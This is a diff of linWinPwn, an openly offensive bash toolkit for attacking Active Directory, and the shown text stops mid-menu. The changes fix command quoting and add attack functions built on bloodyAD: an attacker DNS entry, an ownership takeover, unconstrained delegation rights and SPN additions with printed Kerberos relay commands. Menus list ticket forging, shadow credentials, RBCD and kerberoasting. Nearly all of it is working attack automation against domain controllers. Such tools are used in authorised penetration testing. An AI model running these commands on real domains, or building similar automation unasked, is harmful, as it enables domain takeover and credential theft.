@@ -129,7 +129,7 @@ print_banner () {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.0.10 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.0.11 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -201,7 +201,7 @@ set -- "${args[@]}"
 
 run_command () {
     echo "$(date +%Y-%m-%d\ %H:%M:%S); $@" >> $command_log
-    /usr/bin/script -qc "$@"
+    /usr/bin/script -qc "$@" /dev/null
 }
 
 prepare (){
@@ -675,6 +675,7 @@ dns_enum () {
             fi
             parse_servers
         else
+            parse_servers
             echo -e "${YELLOW}[i] DNS dump found ${NC}"
         fi
     fi
@@ -811,13 +812,13 @@ enum4linux_enum () {
         if [ "${aeskey_bool}" == true ] ; then
             echo -e "${PURPLE}[-] enum4linux does not support kerberos authentication using AES Key${NC}"
         else
-            run_command "${enum4linux_py} -A ${argument_enum4linux} ${target}" -oJ ${output_dir}/DomainRecon/enum4linux_${dc_domain} > ${output_dir}/DomainRecon/enum4linux_${dc_domain}.txt
+            run_command "${enum4linux_py} -A ${argument_enum4linux} ${target} -oJ ${output_dir}/DomainRecon/enum4linux_${dc_domain}" > ${output_dir}/DomainRecon/enum4linux_${dc_domain}.txt
             head -n 20 ${output_dir}/DomainRecon/enum4linux_${dc_domain}.txt 2>&1
             echo -e "............................(truncated output)"
             /usr/bin/jq -r ".users[].username" ${output_dir}/DomainRecon/enum4linux_${dc_domain}.json 2>/dev/null > ${output_dir}/DomainRecon/Users/users_list_enum4linux_${dc_domain}.txt
             if [ "${nullsess_bool}" == true ] ; then
                 echo -e "${CYAN}[*] Guest with empty password (null session)${NC}"
-                run_command "${enum4linux_py} -A ${target} -u 'Guest' -p ''" -oJ ${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}  > ${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}.txt
+                run_command "${enum4linux_py} -A ${target} -u 'Guest' -p '' -oJ ${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}" > ${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}.txt
                 head -n 20 ${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}.txt 2>&1
                 echo -e "............................(truncated output)"
                 /usr/bin/jq -r ".users[].username" ${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}.json 2>/dev/null > ${output_dir}/DomainRecon/Users/users_list_enum4linux_guest_${dc_domain}.txt
@@ -1144,37 +1145,37 @@ ldapper_enum (){
             echo -e "${BLUE}[*] Enumeration of LDAP using ldapper${NC}"
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-n 1"; else ldaps_param="-n 2"; fi
             echo -e "${CYAN}[*] Get all users${NC}"
-            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '1' -f json > ${output_dir}/DomainRecon/LDAPPER/users_output_${dc_domain}.json
+            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '1' -f json" > ${output_dir}/DomainRecon/LDAPPER/users_output_${dc_domain}.json
             /usr/bin/jq -r ".[].samaccountname" ${output_dir}/DomainRecon/LDAPPER/users_output_${dc_domain}.json 2>/dev/null > ${output_dir}/DomainRecon/Users/users_list_ldapper_${dc_domain}.txt
             echo -e "${CYAN}[*] Get all groups (and their members)${NC}"
-            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '2' -f json > ${output_dir}/DomainRecon/LDAPPER/groups_output_${dc_domain}.json
+            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '2' -f json" > ${output_dir}/DomainRecon/LDAPPER/groups_output_${dc_domain}.json
             echo -e "${CYAN}[*] Get all printers${NC}"
-            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '3' -f json > ${output_dir}/DomainRecon/LDAPPER/printers_output_${dc_domain}.json
+            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '3' -f json" > ${output_dir}/DomainRecon/LDAPPER/printers_output_${dc_domain}.json
             echo -e "${CYAN}[*] Get all computers${NC}" 
-            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '4' -f json > ${output_dir}/DomainRecon/LDAPPER/computers_output_${dc_domain}.json
+            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '4' -f json" > ${output_dir}/DomainRecon/LDAPPER/computers_output_${dc_domain}.json
             /usr/bin/jq -r ".[].dnshostname" ${output_dir}/DomainRecon/LDAPPER/computers_output_${dc_domain}.json 2>/dev/null > ${output_dir}/DomainRecon/Servers/servers_list_ldapper_${dc_domain}.txt
             echo -e "${CYAN}[*] Get Domain/Enterprise Administrators${NC}"
-            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '5' -f json > ${output_dir}/DomainRecon/LDAPPER/admins_output_${dc_domain}.json
+            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '5' -f json" > ${output_dir}/DomainRecon/LDAPPER/admins_output_${dc_domain}.json
             echo -e "${CYAN}[*] Get Domain Trusts${NC}"
-            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '6' -f json > ${output_dir}/DomainRecon/LDAPPER/trusts_output_${dc_domain}.json
+            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '6' -f json" > ${output_dir}/DomainRecon/LDAPPER/trusts_output_${dc_domain}.json
             echo -e "${CYAN}[*] Search for Unconstrained SPN Delegations (Potential Priv-Esc)${NC}"
-            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '7' -f json > ${output_dir}/DomainRecon/LDAPPER/unconstrained_output_${dc_domain}.json
+            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '7' -f json" > ${output_dir}/DomainRecon/LDAPPER/unconstrained_output_${dc_domain}.json
             echo -e "${CYAN}[*] Search for Accounts where PreAuth is not required. (ASREPROAST)${NC}"
-            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '8' -f json > ${output_dir}/DomainRecon/LDAPPER/asrep_output_${dc_domain}.json
+            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '8' -f json" > ${output_dir}/DomainRecon/LDAPPER/asrep_output_${dc_domain}.json
             echo -e "${CYAN}[*] Search for User SPNs (KERBEROAST)${NC}"
-            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '9' -f json > ${output_dir}/DomainRecon/LDAPPER/kerberoastable_output_${dc_domain}.json
+            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '9' -f json" > ${output_dir}/DomainRecon/LDAPPER/kerberoastable_output_${dc_domain}.json
             echo -e "${CYAN}[*] Show All LAPS LA Passwords (that you can see)${NC}"
-            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '10' -f json > ${output_dir}/DomainRecon/LDAPPER/ldaps_output_${dc_domain}.json
+            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '10' -f json" > ${output_dir}/DomainRecon/LDAPPER/ldaps_output_${dc_domain}.json
             echo -e "${CYAN}[*] Search for common plaintext password attributes (UserPassword, UnixUserPassword, unicodePwd, and msSFU30Password)${NC}"
-            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '11' -f json > ${output_dir}/DomainRecon/LDAPPER/passwords_output_${dc_domain}.json
+            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '11' -f json" > ${output_dir}/DomainRecon/LDAPPER/passwords_output_${dc_domain}.json
             echo -e "${CYAN}[*] Show All Quest Two-Factor Seeds (if you have access)${NC}"
-            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '12' -f json > ${output_dir}/DomainRecon/LDAPPER/quest_output_${dc_domain}.json
+            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '12' -f json" > ${output_dir}/DomainRecon/LDAPPER/quest_output_${dc_domain}.json
             echo -e "${CYAN}[*] Oracle "orclCommonAttribute" SSO password hash${NC}"
-            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '13' -f json > ${output_dir}/DomainRecon/LDAPPER/oracle_sso_common_output_${dc_domain}.json
+            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '13' -f json" > ${output_dir}/DomainRecon/LDAPPER/oracle_sso_common_output_${dc_domain}.json
             echo -e "${CYAN}[*] Oracle "userPassword" SSO password hash${NC}"
-            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '14' -f json > ${output_dir}/DomainRecon/LDAPPER/oracle_sso_pass_output_${dc_domain}.json
+            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '14' -f json" > ${output_dir}/DomainRecon/LDAPPER/oracle_sso_pass_output_${dc_domain}.json
             echo -e "${CYAN}[*] Get SCCM Servers${NC}"
-            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '15' -f json > ${output_dir}/DomainRecon/LDAPPER/sccm_output_${dc_domain}.json
+            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '15' -f json" > ${output_dir}/DomainRecon/LDAPPER/sccm_output_${dc_domain}.json
         fi
     fi
     echo -e ""
@@ -1289,7 +1290,7 @@ breads_console (){
             echo -e "${BLUE}[*] Launching breads${NC}"
             rm -rf "${HOME}/.breads/${user}_${dc_domain}" 2>/dev/null
             echo "$(date +%Y-%m-%d\ %H:%M:%S); ${breads} | tee -a ${output_dir}/DomainRecon/breads_output_${dc_domain}.txt" >> $command_log
-            (echo -e "create_profile ${user}_${dc_domain}\nload_profile ${user}_${dc_domain}\n${dc_ip}\n${domain}\\\\${user}\n${password}${hash}\ncurrent_profile"; cat /dev/tty) | /usr/bin/script -qc ${breads} | tee -a ${output_dir}/DomainRecon/breads_output_${dc_domain}.txt
+            (echo -e "create_profile ${user}_${dc_domain}\nload_profile ${user}_${dc_domain}\n${dc_ip}\n${domain}\\\\${user}\n${password}${hash}\ncurrent_profile"; cat /dev/tty) | /usr/bin/script -qc ${breads} /dev/null | tee -a ${output_dir}/DomainRecon/breads_output_${dc_domain}.txt
         fi
     fi
     echo -e ""
@@ -1316,7 +1317,7 @@ ldapper_console (){
 
             read -p "> " custom_option </dev/tty
             if [[ ! ${custom_option} == "back" ]]; then
-                run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -s ${custom_option} | tee -a ${output_dir}/DomainRecon/LDAPPER/ldapper_console_output_${dc_domain}.txt
+                run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -s ${custom_option}" | tee -a ${output_dir}/DomainRecon/LDAPPER/ldapper_console_output_${dc_domain}.txt
             else
                 ad_menu
             fi
@@ -1561,7 +1562,7 @@ certipy_ldapshell () {
         if [ "${cert_bool}" == true ] ; then
             echo -e "${BLUE}[*] Launching LDAP shell via Schannel using Certipy ${NC}"
             if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-ldap-scheme ldap"; fi
-            run_command "${certipy} auth -pfx ${pfxcert} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param}" -ldap-shell 2>&1 | tee ${output_dir}/ADCS/certipy_ldapshell_output_${dc_domain}.txt
+            run_command "${certipy} auth -pfx ${pfxcert} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} -ldap-shell" 2>&1 | tee ${output_dir}/ADCS/certipy_ldapshell_output_${dc_domain}.txt
         else
             echo -e "${PURPLE}[-] Certificate authentication required to open LDAP shell using Certipy${NC}"
         fi
@@ -1651,7 +1652,7 @@ ridbrute_attack () {
         run_command "${netexec} ${ne_verbose} smb ${target} -u Guest -p '' --rid-brute --log ${output_dir}/BruteForce/ne_rid_brute_${dc_domain}.txt"
         run_command "${netexec} ${ne_verbose} smb ${target} -u ${rand_user} -p '' --rid-brute --log ${output_dir}/BruteForce/ne_rid_brute_${dc_domain}.txt"
         #Parsing user lists
-        /bin/cat ${output_dir}/BruteForce/ne_rid_brute_${dc_domain}.txt 2>/dev/null | grep "SidTypeUser" | cut -d ":" -f 2 | cut -d "\\" -f 2 | sort -u | sed "s/ (SidTypeUser)//g" > ${output_dir}/DomainRecon/Users/users_list_ridbrute_${dc_domain}.txt 2>&1
+        /bin/cat ${output_dir}/BruteForce/ne_rid_brute_${dc_domain}.txt 2>/dev/null | grep "SidTypeUser" | cut -d "\\" -f 2 | sort -u | sed "s/ (SidTypeUser)//g" > ${output_dir}/DomainRecon/Users/users_list_ridbrute_${dc_domain}.txt 2>&1
         count=$(wc -l ${output_dir}/DomainRecon/Users/users_list_ridbrute_${dc_domain}.txt | cut -d " " -f 1)
         echo -e "${GREEN}[+] Found ${count} users using RID Brute Force${NC}"
         parse_users
@@ -1869,7 +1870,7 @@ kerborpheus_attack () {
             current_dir=$(pwd)
             cd ${scripts_dir}/orpheus-main
             echo "$(date +%Y-%m-%d\ %H:%M:%S); ${orpheus} | tee -a ${output_dir}/Kerberos/orpheus_output_${dc_domain}.txt" >> $command_log
-            (echo -e "cred ${argument_imp}\ndcip ${dc_ip}\nfile ${output_dir}/Kerberos/orpheus_kerberoast_hashes_${dc_domain}.txt\n enc 18\n hex 0x40AC0010"; cat /dev/tty) | /usr/bin/script -qc ${orpheus} | tee -a ${output_dir}/Kerberos/orpheus_output_${dc_domain}.txt
+            (echo -e "cred ${argument_imp}\ndcip ${dc_ip}\nfile ${output_dir}/Kerberos/orpheus_kerberoast_hashes_${dc_domain}.txt\n enc 18\n hex 0x40AC0010"; cat /dev/tty) | /usr/bin/script -qc ${orpheus} /dev/null | tee -a ${output_dir}/Kerberos/orpheus_output_${dc_domain}.txt
             cd ${current_dir}
         fi
     fi 
@@ -2374,21 +2375,6 @@ mssqlclient_console () {
 }
 
 ###### Modification of AD Objects or Attributes
-targetedkerberoast_attack () {
-    if [ ! -f "${targetedKerberoast}" ] ; then
-        echo -e "${RED}[-] Please verify the location of targetedKerberoast.py${NC}"
-    else
-        if [ "${nullsess_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] targetedKerberoast requires credentials${NC}"
-        else
-            echo -e "${BLUE}[*] Targeted Kerberoasting Attack (Noisy!)${NC}"
-            if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
-            run_command "${targetedKerberoast} ${argument_targkerb} -D ${dc_domain} --dc-ip ${dc_ip} ${ldaps_param} --only-abuse --dc-host ${dc_NETBIOS} -o ${output_dir}/Modification/targetedkerberoast_hashes_${dc_domain}.txt" 2>&1 | tee ${output_dir}/Kerberos/targetedkerberoast_output_${dc_domain}.txt
-        fi
-    fi
-    echo -e ""
-}
-
 change_pass () {
     if [ ! -f "${bloodyad}" ] ; then
         echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
@@ -2468,6 +2454,66 @@ add_computer () {
     echo -e ""
 }
 
+dnsentry_add () {
+    if [ ! -f "${bloodyad}" ] ; then
+        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
+    else
+        mkdir -p ${output_dir}/Modification/bloodyAD
+        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support kerberos authentication using AES Key${NC}"          
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
+            echo -e "${BLUE}[*] Please specify hostname of the attacker DNS entry (default: kali):${NC}"
+            hostname_dnstool=""
+            read -p ">> " hostname_dnstool </dev/tty
+            if [ "${hostname_dnstool}" == "" ]; then hostname_dnstool="kali"; fi
+            echo -e "${BLUE}[*] Please confirm the IP of the attacker's machine:${NC}"        
+            set_attackerIP
+            echo -e "${BLUE}[*] Adding new DNS entry for Active Directory integrated DNS${NC}"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add dnsRecord ${hostname_dnstool} ${attacker_IP}" | tee -a ${output_dir}/Modification//bloodyAD/bloodyad_dns_${dc_domain}.txt
+       fi
+    fi
+    echo -e ""
+}
+
+change_owner () {
+    if [ ! -f "${bloodyad}" ] ; then
+        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
+    else
+        mkdir -p ${output_dir}/Modification/bloodyAD
+        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support kerberos authentication using AES Key${NC}"           
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi            
+            echo -e "${BLUE}[*] Changing owner of a user or computer account. Please specify target:${NC}"
+            target_ownerchange=""
+            read -p ">> " target_ownerchange </dev/tty
+            while [ "${target_ownerchange}" == "" ] ; do
+                echo -e "${RED}Invalid name.${NC} Please specify target:"
+                read -p ">> " target_ownerchange </dev/tty
+            done
+            echo -e "${CYAN}[*] Changing Owner of ${target_ownerchange} to ${user}${NC}"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} set owner ${target_ownerchange} ${user}" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_ownerchange_${dc_domain}.txt 
+       fi
+    fi
+    echo -e ""
+}
+
+targetedkerberoast_attack () {
+    if [ ! -f "${targetedKerberoast}" ] ; then
+        echo -e "${RED}[-] Please verify the location of targetedKerberoast.py${NC}"
+    else
+        if [ "${nullsess_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] targetedKerberoast requires credentials${NC}"
+        else
+            echo -e "${BLUE}[*] Targeted Kerberoasting Attack (Noisy!)${NC}"
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
+            run_command "${targetedKerberoast} ${argument_targkerb} -D ${dc_domain} --dc-ip ${dc_ip} ${ldaps_param} --only-abuse --dc-host ${dc_NETBIOS} -o ${output_dir}/Kerberos/targetedkerberoast_hashes_${dc_domain}.txt" 2>&1 | tee ${output_dir}/Modification/targetedkerberoast_output_${dc_domain}.txt
+        fi
+    fi
+    echo -e ""
+}
+
 rbcd_attack () {
     if [ ! -f "${bloodyad}" ] ; then
         echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
@@ -2513,15 +2559,15 @@ shadowcreds_attack () {
             echo -e "${PURPLE}[-] bloodyad requires credentials and does not support kerberos authentication using AES Key${NC}"          
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi            
-            echo -e "${BLUE}[*] Performing ShadowCredentials attack: Create and assign Key Credentials to target. Please specify target:${NC}"
+            echo -e "${BLUE}[*] Performing ShadowCredentials attack: Create and assign Key Credentials to target. Please specify target (add $ if computer account):${NC}"
             target_shadowcreds=""
             read -p ">> " target_shadowcreds </dev/tty
             while [ "${target_shadowcreds}" == "" ] ; do
-                echo -e "${RED}Invalid name.${NC} Please specify target:"
+                echo -e "${RED}Invalid name.${NC} Please specify target (add $ if computer account):"
                 read -p ">> " target_shadowcreds </dev/tty
             done
             echo -e "${CYAN}[*] Performing ShadowCredentials attack against ${target_shadowcreds}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add shadowCredentials '${target_shadowcreds}$' --path ${output_dir}/Credentials/shadowcreds_${target_shadowcreds}" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_shadowcreds_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add shadowCredentials '${target_shadowcreds}' --path ${output_dir}/Credentials/shadowcreds_${target_shadowcreds}" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_shadowcreds_${dc_domain}.txt 
        fi
     fi
     echo -e ""
@@ -2557,23 +2603,53 @@ pygpo_abuse () {
     echo -e ""
 }
 
-dnsentry_add () {
+add_unconstrained () {
     if [ ! -f "${bloodyad}" ] ; then
         echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
     else
-        mkdir -p ${output_dir}/DomainRecon/bloodyAD
+        mkdir -p ${output_dir}/Modification/bloodyAD
         if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ] ; then
             echo -e "${PURPLE}[-] bloodyad requires credentials and does not support kerberos authentication using AES Key${NC}"          
         else
-            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
-            echo -e "${BLUE}[*] Please specify hostname of the attacker DNS entry (default: kali):${NC}"
-            hostname_dnstool=""
-            read -p ">> " hostname_dnstool </dev/tty
-            if [ "${hostname_dnstool}" == "" ]; then hostname_dnstool="kali"; fi
-            echo -e "${BLUE}[*] Please confirm the IP of the attacker's machine:${NC}"        
-            set_attackerIP
-            echo -e "${BLUE}[*] Adding new DNS entry for Active Directory integrated DNS${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add dnsRecord ${hostname_dnstool} ${attacker_IP}" | tee -a ${output_dir}/Modification//bloodyAD/bloodyad_dns_${dc_domain}.txt
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi            
+            echo -e "${BLUE}[*] Adding Unconstrained Delegation rights on owned account. Please specify target:${NC}"
+            target_unconsdeleg=""
+            read -p ">> " target_unconsdeleg </dev/tty
+            while [ "${target_unconsdeleg}" == "" ] ; do
+                echo -e "${RED}Invalid name.${NC} Please specify target:"
+                read -p ">> " target_unconsdeleg </dev/tty
+            done
+            echo -e "${CYAN}[*] Adding Unconstrained Delegation rights to ${target_unconsdeleg}${NC}"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add uac '${target_unconsdeleg}$' -f TRUSTED_FOR_DELEGATION" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_unconsdeleg_${dc_domain}.txt 
+       fi
+    fi
+    echo -e ""
+}
+
+add_spn () {
+    if [ ! -f "${bloodyad}" ] ; then
+        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
+    else
+        mkdir -p ${output_dir}/Modification/bloodyAD
+        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support kerberos authentication using AES Key${NC}"          
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi            
+            echo -e "${BLUE}[*] Adding CIFS and HTTP SPNs to owned computer account. Please specify target:${NC}"
+            target_spn=""
+            read -p ">> " target_spn </dev/tty
+            while [ "${target_spn}" == "" ] ; do
+                echo -e "${RED}Invalid name.${NC} Please specify target:"
+                read -p ">> " target_spn </dev/tty
+            done
+            echo -e "${CYAN}[*] Adding CIFS and HTTP SPNs to ${target_spn}${NC}"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} set object '${target_spn}$' ServicePrincipalName -v 'HOST/${target_spn}' -v 'HOST/${target_spn}.${domain}' -v 'RestrictedKrbHost/${target_spn}' -v 'RestrictedKrbHost/${target_spn}.${domain}' -v 'CIFS/${target_spn}.${domain}' -v 'HTTP/${target_spn}.${domain}'" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_spn_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} set object '${target_spn}$' msDS-AdditionalDnsHostName -v '${target_spn}.${domain}'" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_spn_${dc_domain}.txt
+            if [[ $(grep -a "has been updated" ${output_dir}/Modification/bloodyAD/bloodyad_out_spn_${dc_domain}.txt 2>/dev/null) ]]; then
+                echo -e "${GREEN}[+] Adding CIFS and HTTP SPNs successful! Run command below to perform Kerberos relay attack${NC}"
+                echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip} -l ${target_spn}.${domain} --dc-ip $dc_ip"
+                echo -e "$(which python3) krbrelayx-master/krbrelayx.py -hashes :< NTLM hash of computer account >"
+            fi 
        fi
     fi
     echo -e ""
@@ -3499,12 +3575,12 @@ kerberos_menu () {
     echo -e "7) CVE-2022-33679 exploit / AS-REP with RC4 session key (Null session)"
     echo -e "8) AP-REQ hijack with DNS unsecure updates abuse using krbjack"
     echo -e "9) Run custom Kerberoast attack using Orpheus"
-    echo -e "10) Generate Golden Ticket (requires: DCSync rights or hash of krbtgt)"
-    echo -e "11) Generate Silver Ticket (requires: DCSync rights or hash of service account)"
-    echo -e "12) Generate Diamond Ticket (requires: DCSync rights or hash of krbtgt)"
-    echo -e "13) Generate Sapphire Ticket (requires: DCSync rights or hash of krbtgt)"
+    echo -e "10) Generate Golden Ticket (requires: hash of krbtgt or DCSync rights)"
+    echo -e "11) Generate Silver Ticket (requires: hash of SPN service account or DCSync rights)"
+    echo -e "12) Generate Diamond Ticket (requires: hash of krbtgt or DCSync rights)"
+    echo -e "13) Generate Sapphire Ticket (requires: hash of krbtgt or DCSync rights)"
     echo -e "14) Privilege escalation from Child Domain to Parent Domain using raiseChild (requires: DA rights on child domain)"
-    echo -e "15) Impersonate another user through Delegation (requires: DCSync rights or hash of account allowed for delegation)"
+    echo -e "15) Request impersonated ticket using Constrained Delegation rights (requires: hash of account allowed for delegation or DCSync rights)"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -3851,7 +3927,7 @@ kerberos_menu () {
                     echo -e "${CYAN}[*] Requesting ticket for service $spn...${NC}"
                     current_dir=$(pwd)
                     cd ${output_dir}/Credentials
-                    run_command "${impacket_getST} ${domain}/${tick_servuser} -spn ${tick_spn} "${gethash_key}" -impersonate ${tick_randuser}"
+                    run_command "${impacket_getST} ${domain}/${tick_servuser} -spn ${tick_spn} ${gethash_key} -impersonate ${tick_randuser}"
                     ticket_ccache_out="${tick_randuser}@$(echo ${tick_spn} | sed 's/\//_/g')@${dc_domain^^}.ccache"
                     ticket_kirbi_out="${tick_randuser}@$(echo ${tick_spn} | sed 's/\//_/g')@${dc_domain^^}.kirbi"
                     run_command "${impacket_ticketconverter} ./${ticket_ccache_out} ./${ticket_kirbi_out}"
@@ -4244,14 +4320,17 @@ modif_menu () {
     echo -e "-------------------------------------------------------------"
     echo -e "${YELLOW}[i]${NC} Current target(s): ${curr_targets} ${YELLOW}${custom_servers}${custom_ip}${NC}"
     echo -e "m) Modify target(s)"
-    echo -e "1) Targeted Kerberoast Attack (Noisy!)"
-    echo -e "2) Change user or computer password (Requires: ForceChangePassword on user or computer)"
-    echo -e "3) Add user to group (Requires: GenericWrite or GenericAll on group)"
-    echo -e "4) Add new computer (Requires: MAQ > 0)"
-    echo -e "5) Perform RBCD attack (Requires: GenericWrite or GenericAll on computer)"
-    echo -e "6) Perform ShadowCredentials attack (Requires: AddKeyCredentialLink)"
-    echo -e "7) Abuse GPO to execute command (Requires: GenericWrite or GenericAll on GPO)"
-    echo -e "8) Add new DNS entry"
+    echo -e "1) Change user or computer password (Requires: ForceChangePassword on user or computer)"
+    echo -e "2) Add user to group (Requires: GenericWrite or GenericAll on group)"
+    echo -e "3) Add new computer (Requires: MAQ > 0)"
+    echo -e "4) Add new DNS entry"
+    echo -e "5) Change Owner of target (Requires: WriteOwner permission)"
+    echo -e "6) Targeted Kerberoast Attack (Noisy!)"
+    echo -e "7) Perform RBCD attack (Requires: GenericWrite or GenericAll on computer)"
+    echo -e "8) Perform ShadowCredentials attack (Requires: AddKeyCredentialLink)"
+    echo -e "9) Abuse GPO to execute command (Requires: GenericWrite or GenericAll on GPO)"
+    echo -e "10) Add Unconstrained Delegation rights (Requires: SeEnableDelegationPrivilege rights)"
+    echo -e "11) Add CIFS and HTTP SPNs entries to computer with Unconstrained Deleg rights (Requires: Owner of computer)"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -4259,35 +4338,47 @@ modif_menu () {
 
     case ${option_selected} in
         1)
-        targetedkerberoast_attack
-        modif_menu;;
-
-        2)
         change_pass
         modif_menu;;
 
-        3)
+        2)
         add_group_member
         modif_menu;;
 
-        4)
+        3)
         add_computer
         modif_menu;;
 
+        4)
+        dnsentry_add
+        modif_menu;;
+
         5)
-        rbcd_attack
+        change_owner
         modif_menu;;
 
         6)
-        shadowcreds_attack
+        targetedkerberoast_attack
         modif_menu;;
 
         7)
-        pygpo_abuse
+        rbcd_attack
         modif_menu;;
 
         8)
-        dnsentry_add
+        shadowcreds_attack
